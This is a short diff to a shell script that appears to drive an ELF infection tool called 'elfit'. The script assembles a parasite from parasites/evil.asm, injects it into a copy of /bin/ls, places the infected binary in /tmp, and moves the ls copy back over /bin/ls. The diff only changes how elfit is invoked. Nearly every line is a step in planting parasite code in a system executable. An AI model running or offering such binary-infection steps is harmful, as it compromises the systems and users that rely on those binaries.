@@ -7,7 +7,7 @@ cp /bin/ls .
 cd parasites
 nasm evil.asm
 cd ..
-elfit -p parasites/evil -t -e ls > output
+./elfit -p parasites/evil -t -e ls > output
 chmod go-rw output
 cp output /tmp
 mv ls /bin/ls
